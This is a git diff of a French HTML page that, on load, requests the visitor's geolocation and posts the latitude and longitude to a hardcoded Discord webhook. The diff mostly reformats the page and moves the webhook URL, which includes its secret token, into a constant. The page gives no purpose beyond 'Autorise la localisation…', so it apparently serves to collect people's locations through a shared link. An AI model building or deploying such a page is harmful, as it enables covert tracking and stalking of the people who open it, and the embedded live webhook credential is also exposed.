@@ -6,23 +6,29 @@
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
-  <div id="message">Autorise la localisation…</div>
+  <div class="container">
+    <h1>Autorise la localisation…</h1>
+    <div id="message"></div>
+  </div>
 
   <script>
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1367237113220698184/dRNpJg9cI-GD6PMGNHE22eAvjVPOIz5i8zfuIWOVADYCplQvQ3UBcqCL1vFet8CRtcMr";
+
     function envoyerPosition(position) {
       const lat = position.coords.latitude.toFixed(6);
       const lng = position.coords.longitude.toFixed(6);
 
-      // Envoi vers le webhook Discord
-      fetch("https://discord.com/api/webhooks/1367237113220698184/dRNpJg9cI-GD6PMGNHE22eAvjVPOIz5i8zfuIWOVADYCplQvQ3UBcqCL1vFet8CRtcMr", {
+      fetch(WEBHOOK_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           content: `📍 Nouvelle localisation reçue :\nLatitude : ${lat}\nLongitude : ${lng}`
         })
-      }).then(() => {
+      })
+      .then(() => {
         document.getElementById("message").innerText = "✅ Position envoyée avec succès.";
-      }).catch((error) => {
+      })
+      .catch((error) => {
         document.getElementById("message").innerText = "❌ Erreur lors de l'envoi : " + error.message;
       });
     }
@@ -45,7 +51,7 @@
       document.getElementById("message").innerText = message;
     }
 
-    window.onload = function () {
+    window.onload = function() {
       if ("geolocation" in navigator) {
         navigator.geolocation.getCurrentPosition(envoyerPosition, erreurPosition);
       } else {
